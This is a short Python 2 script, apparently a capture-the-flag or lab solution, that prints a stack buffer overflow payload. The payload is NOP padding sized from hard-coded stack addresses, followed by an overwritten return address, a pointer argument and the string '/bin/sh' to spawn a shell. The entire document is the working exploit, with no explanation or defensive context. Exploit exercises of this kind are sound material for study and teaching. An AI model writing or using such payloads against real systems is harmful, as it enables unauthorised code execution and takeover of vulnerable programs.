from struct import pack

ebp = 0xbffef468
buf = 0xbffef456

return_addr = pack("<I", 0x08048eed)
command_addr = pack("<I", ebp + 12)

print '\x90' * (ebp - buf + 4) + return_addr + command_addr + '/bin/sh'
